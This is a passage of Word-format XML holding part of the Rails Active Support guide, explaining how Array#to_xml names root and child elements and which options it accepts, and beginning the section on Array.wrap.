          <w:p w14:paraId="54FBA502" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;url-id&gt;david-heinemeier-hansson&lt;/url-id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54F628CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0288099B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;/contributors&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70780811" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To do so it sends </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to every item in turn, and collects the results under a root node. All items must respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t>, an exception is raised otherwise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DA78F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, the name of the root element is the underscorized and dasherized plural of the name of the class of the first item, provided the rest of elements belong to that type (checked with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>is_a?</w:t>
      </w:r>
      <w:r>
        <w:t>) and they are not hashes. In the example above that’s “contributors”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235ED706" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If there’s any element that does not belong to the type of the first one the root node becomes “records”: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B5327A6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="086BC55E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[Contributor.first, Commit.first].to_xml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="297F65DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1773AA67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B5CE019" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;records type="array"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="450DFF24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4501DCAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id type="integer"&gt;4583&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="737B8F18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;name&gt;Aaron Batalion&lt;/name&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="662D790A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;rank type="integer"&gt;53&lt;/rank&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79894F11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;url-id&gt;aaron-batalion&lt;/url-id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23AB4899" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0CCE26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F4D8D53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;author&gt;Joshua Peek&lt;/author&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D339D5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;authored-timestamp type="datetime"&gt;2009-09-02T16:44:36Z&lt;/authored-timestamp&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1028EE80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;branch&gt;origin/master&lt;/branch&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D5265B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;committed-timestamp type="datetime"&gt;2009-09-02T16:44:36Z&lt;/committed-timestamp&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D13EBD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;committer&gt;Joshua Peek&lt;/committer&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="704AE427" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;git-show nil="true"&gt;&lt;/git-show&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="041F9898" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id type="integer"&gt;190316&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B2DAC66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;imported-from-svn type="boolean"&gt;false&lt;/imported-from-svn&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="323BB333" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;message&gt;Kill AMo observing wrap_with_notifications since ARes was only using it&lt;/message&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="375685D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;sha1&gt;723a47bfb3708f968821bc969a9a3fc873a3ed58&lt;/sha1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D58780C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16022506" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;/records&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70250EA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If the receiver is an array of hashes the root element is by default also “records”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="19354DED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58B0068A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}, {:c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3}].to_xml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73F7CF4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04D8776C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F6A116B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;records type="array"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="232B3600" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BC368DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;b type="integer"&gt;2&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="229A5EA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;a type="integer"&gt;1&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="172DA58D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D34E23F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00D8646E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;c type="integer"&gt;3&lt;/c&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="089185C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/record&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51C54D5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;/records&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CFB3F30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the collection is empty the root element is by default “nil-classes”. That’s a gotcha, for example the root element of the list of contributors above would not be “contributors” if the collection was empty, but “nil-classes”. You may use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to ensure a consistent root element.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB3CFDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The name of children nodes is by default the name of the root node singularized. In the examples above we’ve seen “contributor” and “record”. The option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:children</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows you to set these node names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3639DFF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> builder is a fresh instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Builder::XmlMarkup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can configure your own builder via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option. The method also accepts options like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dasherize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and friends, they are forwarded to the builder:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7248"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="556B365B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65521E02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Contributor.limit(2).order(:rank).to_xml(:skip_types</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A5628AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7662D7D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48FF94B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;contributors&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF93E79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67DE6373" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id&gt;4356&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="599A1528" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;name&gt;Jeremy Kemper&lt;/name&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="072A8C55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;rank&gt;1&lt;/rank&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06564278" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;url-id&gt;jeremy-kemper&lt;/url-id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3640A1CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="688C15C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="612B769C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;id&gt;4404&lt;/id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B723548" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;name&gt;David Heinemeier Hansson&lt;/name&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4772F99A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;rank&gt;2&lt;/rank&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20DE58BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#     &lt;url-id&gt;david-heinemeier-hansson&lt;/url-id&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CFF5C06" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   &lt;/contributor&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B7A1458" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># &lt;/contributors&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0D11185A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DFFF9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.5 Wrapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235E692E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array.wrap</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> wraps its argument in an array unless it is already an array (or array-like).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F5CB32" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Specifically:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8133ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="279"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the argument is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> an empty list is returned.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B1E131" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="279"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Otherwise, if the argument responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_ary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it is invoked, and if the value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_ary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>, it is returned.</w:t>
      </w:r>
    </w:p>
